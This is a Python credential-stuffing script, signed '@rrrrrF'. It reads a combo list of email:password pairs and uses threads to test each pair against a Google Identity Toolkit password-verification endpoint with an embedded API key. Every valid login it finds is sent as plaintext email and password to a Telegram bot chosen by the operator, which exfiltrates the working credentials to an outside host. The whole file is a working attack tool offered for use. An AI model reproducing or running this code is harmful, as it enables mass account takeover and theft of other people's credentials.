import requests
import json
import os
from concurrent.futures import ThreadPoolExecutor
ok = 0
cp = 0
G2 = '\x1b[38;5;196m'
G27 = '\x1b[38;5;121m'
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
m1 = '\x1b[38;5;196m'
a36 = '\x1b[38;5;228m'
G20 = '\x1b[1;92m\x1b[38;5;212m'
G16 = '\x1b[1;92m\x1b[38;5;208m'
a6 = '\x1b[38;5;5m'
def msg(email, pas):
    global ok, cp
    os.system('clear')
    print(f'{B}ـ' * 40)
    print(f'''{G}[√] Hit : {B}{ok}
{m1}[-] Bad : {a6}{cp}''')
    print(f'{B}ـ' * 40)
    print(f'{S}[+] {B}{email} {S}| {B}{pas}')
    print(f'{B}ـ' * 40)
    print(f'{G16}Golden {m1}- {a36}@rrrrrF')
def Check(email, pas):
    global ok, cp
    data = {
        'email': email,
        'password': pas,
        'returnSecureToken': True
    }
    url = f'https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBW1ZbMiUeDZHYUO2bY8Bfnf5rRgrQGPTM'
    res = requests.post(url, json=data).json()
    if 'idToken' in res:
        ok += 1
        msg(email, pas)
        HitG = (f'''_____________________________
✅ - successful .

✅ - Email - {email} .

✅ - Password - {pas} .
_____________________________
by = @rrrrrf''')
        requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={HitG}")
    elif 'error' in res:
        cp += 1
        msg(email, pas)
os.system('clear')
print(f'{E}ـ' * 40)
path = input(f'{G20}[+] Combo List : {G}')
print(f'{E}ـ' * 40)
ID = input(f'[-]{G27} - Enter Your ID = > ')
print(f'{E}ـ' * 40)
token = input(f'[~]{G16} - Enter Your Token = > ')
print(f'{E}ـ' * 40)
def process_line(line):
    if ':' in line:
        parts = line.split(':')
        if len(parts) == 2:
            return parts[0], parts[1]
    return None, None
Gold123 = [process_line(line.strip()) for line in open(path, 'r').read().splitlines()]
Gold123 = [(email, pas) for email, pas in Gold123 if email and pas]
with ThreadPoolExecutor(max_workers=5) as executor:
    Testss = [executor.submit(Check, email, pas) for email, pas in Gold123]
for Tests in Testss:
    Tests.result()